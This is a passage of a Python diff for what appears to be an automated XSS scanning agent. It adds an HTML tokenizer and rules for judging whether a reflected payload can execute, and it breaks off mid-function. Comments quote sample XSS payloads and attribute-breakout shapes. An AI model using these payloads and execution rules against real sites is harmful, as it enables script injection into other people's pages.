@@ -15,10 +15,14 @@ Date: 2026-01-10
 import asyncio
 import aiohttp
 import json
-from typing import Dict, List, Optional, Any, Tuple
+from typing import Dict, Iterable, List, NamedTuple, Optional, Any, Tuple, Union
 from pathlib import Path
 from dataclasses import dataclass, field, asdict, is_dataclass
 from enum import Enum
+from bisect import bisect_right
+from functools import lru_cache
+from operator import itemgetter as _itemgetter
+import html as html_module
 import re
 import urllib.parse
 from bugtrace.schemas.validation_feedback import ValidationFeedback, FailureReason
@@ -65,6 +69,9 @@ from bugtrace.tools.go_bridge import GoFuzzerBridge, FuzzResult, Reflection
 # v3.3: ManipulatorOrchestrator for Python-only HTTP attack campaigns
 from bugtrace.tools.manipulator.orchestrator import ManipulatorOrchestrator
 from bugtrace.tools.manipulator.models import MutableRequest, MutationStrategy
+# Context → breakout table lives in the manipulator (single source of truth); L3 reuses it
+# instead of keeping a second copy of the same prefixes here.
+from bugtrace.tools.manipulator.context_analyzer import ContextAnalyzer, ReflectionContext
 
 # v3.4: Extracted pure modules
 from bugtrace.agents.xss.waf import (
@@ -95,6 +102,7 @@ from bugtrace.agents.xss.feedback import (
     handle_timing_issue as _pure_handle_timing_issue,
     generate_variant_for_reason as _pure_generate_variant_for_reason,
 )
+from bugtrace.agents.xss import coverage as xss_coverage
 from bugtrace.agents.xss.reporting import (
     get_snippet as _pure_get_snippet,
     save_phase1_report as _pure_save_phase1_report,
@@ -122,6 +130,45 @@ _CDP_PROOF_LOCK = asyncio.Lock()
 # len>=3 drops noisy 1-2 char entries (u/r/l/q/to/go/rd) that would over-escalate common params.
 _REDIRECT_PARAM_SET = frozenset(p.lower() for p in REDIRECT_PARAMS if len(p) >= 3)
 _BROWSER_ONLY_CONTEXTS = frozenset({"href", "url_context", "dom_xss", "js_url"})
+
+# The historical hardcoded reflection marker. `_analyze_reflection_context()` searches for
+# THIS string unless a caller passes an explicit `marker=`, because four of its six call
+# sites pass a full PAYLOAD as `probe_prefix` — see the docstring there.
+_LEGACY_PROBE_MARKER = "BT7331"
+
+# How much HTML around the reflection point is handed to the L3 LLM prompt. A window, not a
+# budget: too small and the model cannot see the enclosing tag, too large and it pays for
+# unrelated markup. The L1 caller truncates the result again to its own limit.
+_REFLECTION_SNIPPET_RADIUS = 250
+
+# The L0.5 char-survival probe. Each special char is bracketed by its own marker pair so its
+# survival is measured independently of the others. Module-level so the coverage record can
+# state WHAT WAS SENT without the caller re-deriving (or drifting from) the literal.
+# Format: BT7331A"BT7331B'BT7331C<BT7331D>BT7331E`BT7331F\BT7331G
+_L05_CHAR_PROBE = 'BT7331A"BT7331B\'BT7331C<BT7331D>BT7331E`BT7331F\\BT7331G'
+
+# What the L0.5 probe observed. "no response" and "responded without the marker" are opposite
+# facts — one is a broken/blocked target, the other is a parameter that is simply not
+# injectable here — and reflects=False alone cannot tell them apart.
+_PROBE_NO_RESPONSE = "no_response"
+_PROBE_NO_REFLECTION = "no_reflection"
+_PROBE_REFLECTED = "reflected"
+
+
+# PURE
+def _as_context_set(contexts: Union[str, Iterable[str], None]) -> frozenset:
+    """Normalise one context label — or any iterable of labels — to a lowercase set.
+
+    A reflection almost always has SEVERAL contexts at once (a search term echoed into an
+    <a href>, into an <input value> and into the body). Consumers that must not lose any of
+    them take the whole set; consumers that need a single label keep using
+    most_exploitable_context(). Accepting a bare string keeps every existing caller valid.
+    """
+    if not contexts:
+        return frozenset()
+    if isinstance(contexts, str):
+        contexts = (contexts,)
+    return frozenset((c or "").lower() for c in contexts if c)
 
 
 @dataclass
@@ -290,6 +337,2028 @@ def _promote_repro(d: Dict[str, Any]) -> Dict[str, Any]:
     return d
 
 
+# =============================================================================
+# REFLECTION POSITION CLASSIFICATION (PURE)
+# =============================================================================
+# HTML standard: the content of these elements is parsed as RCDATA/RAWTEXT — markup
+# inside them is NOT tokenized as tags. A payload reflected there is inert text unless it
+# carries the matching close tag. This is the HTML spec element set, not a heuristic
+# keyword list.
+_RAW_TEXT_ELEMENTS = frozenset({
+    "script", "style", "title", "textarea", "noscript", "xmp",
+    "iframe", "noembed", "noframes",
+})
+
+# The RCDATA half of that set (character references still resolve, markup does not).
+# Only used to label the region: both halves need the appropriate end tag to escape.
+_RCDATA_ELEMENTS = frozenset({"title", "textarea"})
+
+# Positions where the HTML tokenizer PROVES the payload cannot be parsed as markup.
+# Every other label — including anything unrecognised — counts as executable: we fail
+# OPEN, because a false positive is recoverable but a silently dropped vulnerability is not.
+_INERT_REFLECTION_POSITIONS = frozenset({
+    "rawtext_inert", "attribute_quoted_inert", "comment_inert", "script_js_inert",
+    # HTML standard, "the template element": the contents of a <template> are parsed into
+    # a SEPARATE document that is never rendered, so nothing in it loads, fires or runs.
+    "template_inert",
+    # HTML tree construction, "after frameset" insertion mode: in a frameset document the
+    # <body> and everything else outside the frameset is dropped on the floor.
+    "frameset_inert",
+    # ECMAScript: an inline classic script that does not PARSE is discarded whole, so the
+    # code the payload smuggled in never runs either.
+    "script_js_syntax_error",
+})
+
+# Positions that are re-parsed as DOCUMENT TEXT: whatever the payload does there, it has
+# to open a tag, so it needs both angle brackets. (A breakout label lands here too: once
+# the payload has closed the raw-text element / the comment, it is back in text.)
+_TEXT_REFLECTION_POSITIONS = frozenset({
+    "html_text", "rawtext_breakout", "comment_breakout",
+})
+
+# Positions that are re-parsed INSIDE A START TAG: the payload does not need angle
+# brackets there, it only has to declare one more attribute. HTML defines event handler
+# content attributes as the `on<eventname>` family (HTML "event handlers" section), so
+# that shape — not a list of individual handler names — is what proves execution.
+_TAG_REFLECTION_POSITIONS = frozenset({
+    "attribute_unquoted", "attribute_quoted_breakout",
+})
+_EVENT_HANDLER_ATTR_RE = re.compile(r"(?:^|[\s\"'/])(on[a-z]+)\s*=", re.IGNORECASE)
+# A '<' only opens a tag when an ASCII letter follows it (HTML tokenizer, tag open state).
+# '</' opens an END tag, which creates nothing.
+_TAG_OPEN_RE = re.compile(r"<[a-zA-Z]")
+
+# HTML "load"/"error" events are fired by the RESOURCE FETCH processing model, so they
+# only ever reach an element that actually fetches something. `onerror` smuggled onto a
+# <div>/<input type=text> is a dead handler — this is the difference between the corpus'
+# `<img src=x alt=PAYLOAD>` (fires) and `<input value=PAYLOAD>` (does not).
+_RESOURCE_EVENTS = frozenset({"onerror", "onload"})
+
+# Element-state suffix: the tokenizer records `<input type=hidden>` as "input\x00hidden".
+# NUL cannot occur in a real tag name (the tokenizer replaces it with U+FFFD), so the
+# compound name can never collide with an element the page actually contains.
+_ELEMENT_STATE_SEP = "\x00"
+
+_RESOURCE_LOADING_ELEMENTS = frozenset({
+    "img", "image", "script", "link", "style", "iframe", "frame", "embed", "object",
+    "source", "track", "video", "audio", "body", "frameset", "applet", "bgsound",
+    "input" + _ELEMENT_STATE_SEP + "image",
+})
+
+# Elements that are never rendered, so NO user-triggerable event can reach them and no
+# resource fetch can fail on them. `<input type=hidden>` is the one that matters: hidden
+# fields are the single commonest reflection sink on ordinary sites, and the product's own
+# no-angle-bracket bypass (`" autofocus onfocus=...`) is dead on them.
+_NOT_RENDERED_ELEMENTS = frozenset({"input" + _ELEMENT_STATE_SEP + "hidden"})
+
+# HTML "focus"/"blur" are dispatched at the FOCUSABLE AREA that gains or loses focus and
+# do NOT bubble, so a handler for them only ever runs on an element that can be focused in
+# the first place. `onfocus autofocus` smuggled onto a <div>/<span>/<td> is a dead handler
+# — which is what the product's own no-angle-bracket bypass lands on whenever the server
+# encodes '<' and '>' but lets '"' through.
+# `focusin`/`focusout` are deliberately NOT here: those two DO bubble, so a focusable
+# DESCENDANT reaches them, and whether the element has one is not a fact about its start
+# tag. Unknowable ⇒ fail OPEN.
+_NON_BUBBLING_FOCUS_EVENTS = frozenset({"onfocus", "onblur"})
+
+# HTML standard, "focusable area": what is focusable WITHOUT the author asking for it.
+# `object`/`embed`/`body`/`frameset`/`html` are in here as a FAIL OPEN rather than as a
+# claim — an <embed>/<object> becomes focusable once it renders its content, and a
+# <body>/<frameset> FORWARDS its focus handler to the Window (HTML, "window-reflecting
+# body element event handler set"), so window activation fires it. Neither is decidable
+# from the response body, and a missed false positive costs less than a lost finding.
+_FOCUSABLE_ELEMENTS = frozenset({
+    "button", "select", "textarea", "input", "summary",
+    "iframe", "frame", "object", "embed", "body", "frameset", "html",
+})
+
+# ... and the elements that only become focusable areas when they carry one of a set of
+# attributes: a hyperlink needs its href, a media element needs the controls UI to put a
+# control in the focus order. (<a> without href and <audio> without controls are
+# measurably inert.) `xlink:href` is the SVG 1.1 spelling of the same hyperlink and is
+# what an <svg><a> in the wild actually carries.
+_FOCUSABLE_WITH_ATTRIBUTE = {
+    "a": ("href", "xlink:href"), "area": ("href", "xlink:href"),
+    "audio": ("controls",), "video": ("controls",),
+}
+
+# Attributes that make ANY element a focusable area: `tabindex` puts it in the sequential
+# focus navigation order, `contenteditable` makes it an editing host.
+_UNIVERSAL_FOCUS_ATTRIBUTES = ("tabindex", "contenteditable")
+
+# HTML, "focusable area": a form control whose `disabled` attribute is set is excluded by
+# definition, and no tabindex buys it back (measured: <input disabled tabindex=0> takes no
+# focus in Chromium, while <div disabled tabindex=0> does — `disabled` is only DEFINED on
+# these elements, so the attribute on its own decides nothing).
+# The one hatch is a script that later removes the attribute. It is left closed because
+# the browser this agent hands its findings to is the same one measured here: a payload
+# that cannot fire in Chromium cannot be visually validated either, so confirming it
+# produces a report nobody can reproduce.
+_DISABLEABLE_ELEMENTS = frozenset({
+    "button", "input", "select", "textarea", "optgroup", "option", "fieldset",
+})
+
+# HTML Standard, "Index of elements", plus the obsolete names the parser still knows. A
+# name OUTSIDE this index is a foreign (SVG / MathML) or custom element, and for those
+# "is it a focusable area" is NOT a fact about the name: Chromium takes focus on every
+# RENDERED SVG element — <svg> itself, g, rect, circle, text, image, and <a> with no href
+# at all — with no tabindex anywhere. Unknown name ⇒ unknown focusability ⇒ FAIL OPEN.
+#
+# `image` is deliberately ABSENT: it is a rendered (therefore focusable) SVG element, and
+# in HTML content the parser rewrites <image> to <img>, so leaving it out costs nothing.
+# The names that ARE shared with SVG — a, script, style, title, font — are kept because
+# their SVG counterparts are measurably unfocusable, EXCEPT svg:a, whose focusability
+# without an href is the one case this set gets wrong (see _element_is_focusable).
+_HTML_ELEMENTS = frozenset({
+    "a", "abbr", "address", "area", "article", "aside", "audio", "b", "base", "bdi",
+    "bdo", "blockquote", "body", "br", "button", "canvas", "caption", "cite", "code",
+    "col", "colgroup", "data", "datalist", "dd", "del", "details", "dfn", "dialog",
+    "div", "dl", "dt", "em", "embed", "fieldset", "figcaption", "figure", "footer",
+    "form", "h1", "h2", "h3", "h4", "h5", "h6", "head", "header", "hgroup", "hr",
+    "html", "i", "iframe", "img", "input", "ins", "kbd", "label", "legend", "li",
+    "link", "main", "map", "mark", "menu", "meta", "meter", "nav", "noscript",
+    "object", "ol", "optgroup", "option", "output", "p", "picture", "pre", "progress",
+    "q", "rp", "rt", "ruby", "s", "samp", "script", "search", "section", "select",
+    "slot", "small", "source", "span", "strong", "style", "sub", "summary", "sup",
+    "table", "tbody", "td", "template", "textarea", "tfoot", "th", "thead", "time",
+    "title", "tr", "track", "u", "ul", "var", "video", "wbr",
+    # obsolete, but the HTML parser still builds them and none is ever focusable
+    "acronym", "applet", "basefont", "bgsound", "big", "blink", "center", "dir",
+    "font", "frame", "frameset", "isindex", "keygen", "listing", "marquee",
+    "menuitem", "nobr", "noembed", "noframes", "param", "plaintext", "rb", "rtc",
+    "spacer", "strike", "tt", "xmp",
+})
+
+# Attribute-name lookups on a start tag's name text, compiled once per attribute name.
+_ATTR_NAME_RE_CACHE: Dict[str, "re.Pattern[str]"] = {}
+
+
+# PURE
+def _has_attribute(host: str, name: str) -> bool:
+    """True when the start-tag name text `host` really declares the attribute `name`.
+
+    A plain substring test is not enough HERE because the answer is used to REJECT: an
+    `aria-disabled="true"` (which leaves the control perfectly focusable) or a
+    `data-disabled` would otherwise read as `disabled` and delete a real finding. The
+    delimiters are the ones the tokenizer can put around an attribute name — whitespace,
+    '/', '=' and the tag's own '<'/'>'.
+
+    The focus-GRANTING attributes deliberately keep the looser substring test: there a
+    spurious match answers "focusable", which fails OPEN.
+    """
+    pattern = _ATTR_NAME_RE_CACHE.get(name)
+    if pattern is None:
+        pattern = re.compile(r"(?:^|[\s/<])" + re.escape(name) + r"(?=[\s/=>]|$)",
+                             re.IGNORECASE)
+        _ATTR_NAME_RE_CACHE[name] = pattern
+    return pattern.search(host) is not None
+
+
+# PURE
+def _element_name(tag: str) -> str:
+    """The bare element name of a tokenizer tag label ("input\\x00hidden" -> "input")."""
+    if _ELEMENT_STATE_SEP in tag:
+        return tag.split(_ELEMENT_STATE_SEP, 1)[0]
+    return tag
+
+
+# PURE
+def _payload_opens_element(text: str, tail_closes: bool = False) -> bool:
+    """True when `text`, parsed as document text, creates an element.
+
+    Not ``'<' in text and '>' in text``: `</script>` and `a < b > c` contain both and
+    create nothing. The HTML tokenizer only leaves the data state for a '<' followed by an
+    ASCII letter, and the element only exists once a '>' closes its tag.
+
+    That '>' does not have to be in the payload. Once the tokenizer is inside a tag it
+    stays there, eating the document as attribute names, until the NEXT '>' anywhere —
+    which is why `<div><img src=x onerror=alert(1) </div>` really does build an <img>,
+    while the same fragment written at the very end of the document builds nothing.
+    `tail_closes` is that fact about the rest of the response.
+    """
+    m = _TAG_OPEN_RE.search(text)
+    if m is None:
+        return False
+    return tail_closes or text.find(">", m.end()) != -1
+
+
+# PURE
+def _payload_escapes_tag(text: str, tail_closes: bool = False) -> bool:
+    """True when `text`, injected INSIDE a start tag, gets back out and opens an element.
+
+    Everything before the payload's first '>' is still attributes of the element the
+    server wrote; only what follows that '>' is document text again.
+    """
+    gt = text.find(">")
+    return gt != -1 and _payload_opens_element(text[gt + 1:], tail_closes)
+
+
+# PURE
+def _element_is_focusable(tag: str, host: str) -> bool:
+    """True when element `tag`, carrying the attribute names `host`, is a focusable area.
+
+    `host` is the ATTRIBUTE-NAME text of the element's start tag (see
+    _host_attribute_names) — the element's own name plus every attribute name the
+    tokenizer read on it, WHOEVER wrote them: a `tabindex` the payload smuggled in is as
+    real to the browser as one the server printed.
+
+    Fails OPEN when either input is unknown. Everything else follows the HTML standard's
+    definition of a focusable area: an author attribute that focuses any element, the
+    elements that are focusable on their own, and the ones whose focusability is
+    conditional on an attribute of theirs.
+
+    KNOWN LIMITATION, measured and left open on purpose: focusability is
+    (name x attributes x ANCESTOR) and only the first two are in a start tag. A <summary>
+    is focusable inside a <details> and inert on its own, and an <a> with no href is inert
+    in HTML content but focusable inside an <svg>. Both are resolved the fail-OPEN way for
+    <summary> (kept in _FOCUSABLE_ELEMENTS) and the fail-CLOSED way for <a> (an hrefless
+    <a> is an ordinary page element, an hrefless svg:a is not a thing sites ship), so
+    svg:a is the one shape this predicate is knowingly wrong about.
+    """
+    if not tag or not host:
+        return True  # unknown element or unknown attributes → fail OPEN
+    if tag in _NOT_RENDERED_ELEMENTS:
+        return False  # not rendered: nothing focuses it, tabindex included
+    name = _element_name(tag)
+    if name not in _HTML_ELEMENTS:
+        return True  # foreign / custom element: focusability is not in the name → OPEN
+    if name in _DISABLEABLE_ELEMENTS and _has_attribute(host, "disabled"):
+        return False  # a disabled form control is not a focusable area, tabindex or not
+    if any(attr in host for attr in _UNIVERSAL_FOCUS_ATTRIBUTES):
+        return True
+    if name in _FOCUSABLE_ELEMENTS:
+        return True
+    required = _FOCUSABLE_WITH_ATTRIBUTE.get(name)
+    return required is not None and any(attr in host for attr in required)
+
+
+# PURE
+def _payload_handler_fires(text: str, tag: str, host: str = "") -> bool:
+    """True when an event handler `text` declares can actually fire on element `tag`.
+
+    Fails OPEN on an unknown element and on any handler outside the families whose firing
+    conditions the HTML standard pins down exactly: the resource load/error events, the
+    non-bubbling focus events, and "the element is not rendered at all". Mouse and
+    keyboard handlers on an ordinary rendered element keep counting as execution, which is
+    what the product's quote-only attribute bypass depends on.
+
+    The two element-dependent families are the same fact seen twice — a handler whose
+    event is only ever dispatched at an element of a certain kind is dead everywhere else.
+    `onerror` needs an element that FETCHES; `onfocus` needs one that can be FOCUSED.
+
+    `host` is the owning start tag's attribute-name text, needed because focusability is
+    an attribute-level property; "" means it was not available and the focus check fails
+    OPEN rather than guessing.
+    """
+    names = {m.lower() for m in _EVENT_HANDLER_ATTR_RE.findall(text)}
+    if not names:
+        return False
+    if tag and tag in _NOT_RENDERED_ELEMENTS:
+        return False
+    if (tag and names <= _RESOURCE_EVENTS
+            and tag not in _RESOURCE_LOADING_ELEMENTS
+            and _element_name(tag) not in _RESOURCE_LOADING_ELEMENTS):
+        return False
+    if (tag and names <= _NON_BUBBLING_FOCUS_EVENTS
+            and not _element_is_focusable(tag, host)):
+        return False
+    return True
+
+
+# PURE
+def _position_executes(position: str, payload: str, tag: str = "",
+                       tail_closes: bool = True, host: str = "") -> bool:
+    """True when a payload reflected at `position` can actually reach the JS engine.
+
+    Replaces the blanket ``'<' in payload and '>' in payload`` gate that used to run
+    BEFORE the classifier and threw its answer away. That gate encoded "XSS means
+    injecting a tag", which is false for every target that filters angle brackets — and
+    the product ships quote-only attribute breakouts (``" autofocus onfocus=...``) as its
+    bypass for exactly that filter. The requirement now applies ONLY where the payload
+    really is re-parsed as document text.
+
+    `tag` is the element that OWNS the injection point (empty when unknown) and `host` is
+    that element's start-tag attribute names. Inside a start tag the payload has exactly
+    two ways out, and both are element-dependent: leave the tag and open an element of its
+    own, or declare a handler the owning element can actually fire.
+
+    Unknown labels return True: fail OPEN, a silent drop is not recoverable.
+    """
+    if position in _INERT_REFLECTION_POSITIONS:
+        return False
+    if position in _TEXT_REFLECTION_POSITIONS:
+        return _payload_opens_element(payload, tail_closes)
+    if position in _TAG_REFLECTION_POSITIONS:
+        return (_payload_escapes_tag(payload, tail_closes)
+                or _payload_handler_fires(payload, tag, host))
+    return True
+
+
+# HTML "foreign content" roots. Inside an <svg>/<math> subtree the RCDATA/RAWTEXT rule
+# does NOT apply: svg:style is an ordinary foreign element, not raw text.
+_FOREIGN_ROOTS = frozenset({"svg", "math"})
+
+# HTML tree construction, "any other start tag" in foreign content: these HTML elements
+# force the parser back OUT of the foreign subtree, so anything after them is HTML again.
+_FOREIGN_BREAKOUT_ELEMENTS = frozenset({
+    "b", "big", "blockquote", "body", "br", "center", "code", "dd", "div", "dl", "dt",
+    "em", "embed", "h1", "h2", "h3", "h4", "h5", "h6", "head", "hr", "i", "img", "li",
+    "listing", "menu", "meta", "nobr", "ol", "p", "pre", "ruby", "s", "small", "span",
+    "strong", "strike", "sub", "sup", "table", "tt", "u", "ul", "var", "font",
+})
+
+# HTML tree construction, "HTML integration point" / "MathML text integration point":
+# the CONTENT of these foreign elements is parsed with the ordinary HTML rules, so the
+# RCDATA/RAWTEXT elements inside them are raw text again (<svg><foreignObject><textarea>
+# really is an inert textarea).
+_SVG_INTEGRATION_POINTS = frozenset({"foreignobject", "desc", "title"})
+_MATHML_INTEGRATION_POINTS = frozenset({"mi", "mo", "mn", "ms", "mtext"})
+
+# Region kinds a payload can open with its own first character: '<' opens a tag / comment
+# / CDATA section, and a quote closes the attribute value the payload was injected into
+# (which starts a fresh "tag" run). Everything else is server-written context.
+_PAYLOAD_OPENED_KINDS = frozenset({"tag", "comment", "cdata"})
+
+# Whitespace per the HTML tokenizer (NOT str.isspace(): no vertical tab, no NBSP).
+_HTML_SPACE = " \t\n\f\r"
+
+# ---------------------------------------------------------------------------
+# HTML REGION LAYOUT
+# ---------------------------------------------------------------------------
+# A region is one contiguous run of the document that shares a single tokenizer state.
+# It is a PLAIN TUPLE, not a NamedTuple, and that is a cost decision, not a style one:
+# a 200 KB page produces ~25k regions and namedtuple.__new__ is a Python-level call, so
+# the class cost ~7 ms per classification — on a layer whose entire reason to exist is
+# being cheap enough to run before the Playwright screenshot. Field order:
+#
+#   [0] start  first offset covered
+#   [1] end    one past the last offset covered
+#   [2] kind   data | rcdata | rawtext | plaintext | comment | cdata
+#              | tag (tag name / attribute name / after-attribute-value)
+#              | attr_unquoted | attr_value (quoted)
+#   [3] tag    element name owning the region ("" when unknown)
+#   [4] attr   attribute name (attr_value / attr_unquoted regions only)
+#
+# The old `quote` and `foreign` fields are gone: both were written on every region and
+# read by nobody.
+_R_START, _R_END, _R_KIND, _R_TAG, _R_ATTR = 0, 1, 2, 3, 4
+
+_HtmlRegion = Tuple[int, int, str, str, str]
+
+# Scanning primitives. Every one of these replaces a per-character Python loop with a
+# single C-level engine call — the tokenizer walks tags, not bytes.
+#
+# A markup start is '<' followed by '!' or '?' (doctype / PI / comment / CDATA) or by an
+# optional '/' and an ASCII letter (a tag name). Any other '<' is literal text ("a < b"),
+# exactly as the HTML tokenizer treats it. Group 1 is the element name, so finding the
+# markup and reading its name is a single engine call.
+_MARKUP_RE = re.compile(r"<(?:[!?]|/?([a-zA-Z][^ \t\n\f\r/=>]*))")
+# One step inside a start/end tag: '>' | '/' | name [ '=' value-start ].
+# Group 1 '>', group 2 '/', group 3 name, group 4 the '=' with its surrounding space,
+# group 5 the opening quote OR the whole unquoted value.
+_TAG_STEP_RE = re.compile(
+    r"[ \t\n\f\r]*"
+    r"(?:(>)|(/)|([^ \t\n\f\r/=>]*)(?:([ \t\n\f\r]*=[ \t\n\f\r]*)([\"']|[^ \t\n\f\r>]*))?)"
+)
+# Both comment terminators in ONE scan. Searching for "-->" and "--!>" separately meant
+# every comment whose text lacked "--!>" scanned the whole rest of the document for it,
+# which is quadratic in the page size — the same shape as the gospider JS-mining blow-up.
+_COMMENT_END_RE = re.compile(r"--!?>")
+# A <script> element cannot exist in a body that never opens one — the cheapest possible
+# way to skip tokenizing the document for the inline-script check.
+_SCRIPT_OPEN_RE = re.compile(r"<script", re.IGNORECASE)
+
+# The two region kinds that hold an attribute VALUE.
+_ATTR_VALUE_KINDS = ("attr_value", "attr_unquoted")
+
+# Every region kind a START TAG is made of: the name / attribute-name runs plus the two
+# value kinds. A tag's regions are emitted gap-free, so this is what makes "walk out to
+# the element that owns this offset" a local step rather than a re-parse.
+_IN_TAG_KINDS = frozenset(("tag",) + _ATTR_VALUE_KINDS)
+
+# Elements whose VALUE-LESS attributes change what their content means, so the tokenizer
+# has to spend a lower() on their attribute names (<script nomodule>, <iframe sandbox>).
+_BARE_ATTR_ELEMENTS = frozenset({"script", "iframe"})
+
+# Elements that need a second look at their own attributes once the tag is tokenized:
+# an <input>'s type decides which events can reach it, an <iframe>'s sandbox decides
+# whether its srcdoc can script, and a <meta> may be carrying a CSP.
+_POST_PASS_ELEMENTS = frozenset({"input", "iframe", "meta"})
+
+# Carried in a <script> content region instead of a type when the browser never executes
+# that content. Not a MIME type, so it can never be mistaken for one.
+_SCRIPT_BODY_IGNORED = "\x00ignored"
+
+
+# PURE
+def _scan_tag(html: str, n: int, i: int, tag: str, out: List[_HtmlRegion],
+              bare_names: bool = False) -> Tuple[int, bool]:
+    """Tokenize one start/end tag starting at `i` (first char after the tag name).
+
+    Appends a region per attribute-name / attribute-value run and returns
+    (offset just past the '>', self_closing).
+
+    Regions are emitted GAP-FREE — every offset of the tag belongs to exactly one region,
+    delimiters included. A gap would make _region_index_at() return -1 for a payload that
+    starts on a quote (`value=""` immediately followed by the injected attributes), and
+    "no region" is the fail-open text answer, which is wrong inside a tag.
+
+    `bare_names` records VALUE-LESS attribute names in the region's attr field. It is off
+    by default because the lower()-per-attribute it costs is pure waste on the ~7,000
+    attributes of an ordinary page: only a handful of elements have a boolean attribute
+    that changes what their content means (<script nomodule>, <iframe sandbox>).
+    """
+    self_closing = False
+    run_start = i
+    step = _TAG_STEP_RE.match
+    while i < n:
+        if html[i] == ">":  # by far the commonest step: no leading space, tag over
+            out.append((run_start, i + 1, "tag", tag, ""))
+            return i + 1, self_closing
+        regs = step(html, i).regs
+        gt = regs[1][0]
+        if gt != -1:
+            out.append((run_start, gt + 1, "tag", tag, ""))
+            return gt + 1, self_closing
+        solidus = regs[2][0]
+        if solidus != -1:
+            self_closing = html[solidus + 1: solidus + 2] == ">"
+            i = solidus + 1
+            continue
+        name_start, after_name = regs[3]
+        if name_start >= n:
+            break  # trailing whitespace only: the tag never ended
+        self_closing = False
+        value_at = regs[4][1]
+        if value_at == -1:  # no '=' → the name stands alone, the run continues
+            out.append((run_start, after_name, "tag", tag,
+                        html[name_start:after_name].lower() if bare_names else ""))
+            i = run_start = after_name
+            continue
+        attr = html[name_start:after_name].lower()
+        quote = html[value_at: value_at + 1]
+        if quote == '"' or quote == "'":
+            value_start = value_at + 1
+            out.append((run_start, value_start, "tag", tag, ""))
+            close = html.find(quote, value_start)
+            if close == -1:  # unterminated value: the rest of the document is the value
+                out.append((value_start, n, "attr_value", tag, attr))
+                return n, self_closing
+            out.append((value_start, close, "attr_value", tag, attr))
+            # The closing delimiter itself is back in the tag: a payload that starts ON it
+            # is declaring new attributes, not sitting in the value.
+            i, run_start = close + 1, close
+        else:
+            out.append((run_start, value_at, "tag", tag, ""))
+            out.append((value_at, regs[5][1], "attr_unquoted", tag, attr))
+            i = run_start = regs[5][1]
+    return n, self_closing
+
+
+# PURE
+def _scan_html(html: str, limit: int, xml: bool = False) -> Tuple[List[_HtmlRegion],
+                                                                 List[Tuple[int, int]], int]:
+    """Tokenize `html` left to right into parse-state regions, up to `limit`.
+
+    Replaces the old ``html.rfind('<', 0, pos)`` backward guess, which assumed the nearest
+    '<' opened the enclosing tag. That guess mislabelled every value holding a literal '<'
+    (a price "Prices < 100", a docs page quoting <div>) and every attribute holding an
+    earlier copy of the payload — the multi-occurrence false confirm. A single forward pass
+    carries real tokenizer state instead, so no position is ever re-anchored on a guess.
+
+    `limit` is the last offset any caller will ask about. Scanning stops as soon as the
+    emitted regions cover it — the predicate only ever needs the parse state AT the payload
+    occurrences, so tokenizing the rest of the document is work nobody reads. Regions are
+    still emitted whole: the cut is taken between constructs, never inside one.
+
+    `xml` selects the XML parsing rules (an application/xhtml+xml or image/svg+xml
+    response). The only difference that reaches this layer is the solidus: in XML `<x/>`
+    really does close the element, while in text/html the solidus on a non-void HTML
+    element is a parse error and is IGNORED, so `<script src=a/>` opens raw text that
+    swallows the rest of the document.
+
+    Returns (regions, inert subtree spans, frameset offset). The spans are <template>
+    contents: HTML standard, "the template element" — the contents are parsed into a
+    separate, never-rendered document, so nothing in them loads, fires or runs. The
+    frameset offset is where a frameset document stopped keeping character data (-1 when
+    the document is not one).
+
+    Linear in min(len(html), limit): every branch advances the cursor with one C-level
+    scan, and no pattern can backtrack.
+    """
+    n = len(html)
+    lower = html.lower()
+    out: List[_HtmlRegion] = []
+    inert: List[Tuple[int, int]] = []
+    i = data_start = 0
+    foreign_depth = 0
+    foreign_root = ""
+    template_depth = 0
+    template_start = -1
+    # A <frameset> before any body content makes this a FRAMESET DOCUMENT: from there on
+    # the tree builder is in "in frameset"/"after frameset" and every character token and
+    # <body> is ignored. The "before any body content" guard is what keeps a stray
+    # <frameset> in the middle of a real page from blanking the rest of it.
+    frameset = -1
+    saw_body = False
+    search = _MARKUP_RE.search
+    while i < n:
+        if data_start > limit:
+            # Everything the caller can ask about is covered. A <template> still open at
+            # the cut necessarily contains the payload — the tokenizer is already PAST it,
+            # so any </template> before it would have been seen — hence close it here
+            # rather than lose the span with the early return.
+            if template_depth > 0:
+                inert.append((template_start, n))
+            return out, inert, frameset
+        m = search(html, i)
+        if m is None:
+            break
+        lt = m.start()
+        name_at, j = m.span(1)
+        nxt = html[lt + 1]
+        bang = nxt == "!"
+        is_comment = bang and html.startswith("<!--", lt)
+        is_cdata = bang and (xml or foreign_depth > 0) and lower.startswith("<![cdata[", lt)
+        closing = nxt == "/"
+        if lt > data_start:  # flush the text run this markup ends
+            out.append((data_start, lt, "data", "", ""))
+            if not saw_body and frameset < 0 and html[data_start:lt].strip():
+                saw_body = True
+        if is_comment:
+            out.append((lt, _comment_end(html, lt, n), "comment", "", ""))
+            i = data_start = out[-1][_R_END]
+            continue
+        if is_cdata:
+            close = html.find("]]>", lt + 9)
+            end = n if close == -1 else close + 3
+            out.append((lt, end, "cdata", "", ""))
+            i = data_start = end
+            continue
+        if bang or nxt == "?":  # doctype / processing instruction → bogus comment
+            close = html.find(">", lt + 1)
+            end = n if close == -1 else close + 1
+            out.append((lt, end, "comment", "", ""))
+            i = data_start = end
+            continue
+        tag = lower[name_at:j]
+        mark = len(out)
+        out.append((lt, j, "tag", tag, ""))
+        i, self_closing = _scan_tag(html, n, j, tag, out, tag in _BARE_ATTR_ELEMENTS)
+        data_start = i
+        # One set membership instead of a comparison chain on every one of a page's
+        # ~5,000 tags, and never on an END tag, which carries no attributes.
+        if tag in _POST_PASS_ELEMENTS and not closing:
+            if tag == "input":
+                tag = _apply_input_state(html, out, mark)
+            elif tag == "iframe":
+                _apply_iframe_sandbox(html, out, mark)
+            else:
+                _apply_meta_csp(html, out, mark)
+        if closing:
+            if template_depth > 0 and tag == "template":
+                template_depth -= 1
+                if template_depth == 0:
+                    inert.append((template_start, lt))
+            elif foreign_depth > 0 and tag in _FOREIGN_ROOTS:
+                foreign_depth -= 1
+                if foreign_depth == 0:
+                    foreign_root = ""
+            continue
+        if tag == "template":
+            if template_depth == 0:
+                template_start = i
+            template_depth += 1
+            continue
+        if tag in _FOREIGN_ROOTS:
+            if not self_closing:
+                if foreign_depth == 0:
+                    foreign_root = tag
+                foreign_depth += 1
+            continue
+        if foreign_depth > 0:
+            # An SVG <script> is a real script element: its text content is compiled and
+            # run. (MathML has no script element — <math><script> is measurably inert in
+            # Chromium, so it must NOT be given the same treatment.)
+            if foreign_root == "svg" and tag == "script" and not self_closing:
+                end = _find_appropriate_end_tag(lower, i, tag)
+                out.append((i, end, "rawtext", tag, _script_body_type(html, out, mark)))
+                i = data_start = end
+                continue
